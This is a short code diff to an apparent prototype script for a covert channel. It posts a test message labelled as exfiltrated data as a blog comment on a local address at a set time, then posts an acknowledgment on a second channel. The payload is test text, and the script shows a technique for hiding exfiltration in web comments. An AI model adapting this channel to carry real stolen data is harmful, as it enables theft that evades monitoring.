@@ -13,12 +13,18 @@ target_blog = "http://127.0.0.3/"
 exfil_channel_id = 5
 ack_channel_id = 7
 
-time_slot = "1:11"
+send_time_slot = "1:11"
+confirm_time_slot = "3:33"
 
-delay_to_timeslot(time_slot)
+delay_to_timeslot(send_time_slot)
 
 print("Triggered at: " + str(datetime.datetime.now().time()))
 
-random_string = generate_random_string(10)
-response = submit_comment(target_blog, exfil_channel_id, random_string + ": Exfiltrated Data Test")
+message_id = generate_random_string(10)
+response = submit_comment(target_blog, exfil_channel_id, message_id + ": Exfiltrated Data Test")
 print(response)
+
+delay_to_timeslot(confirm_time_slot)
+response = response = submit_comment(target_blog, ack_channel_id, message_id)
+print(response)
+
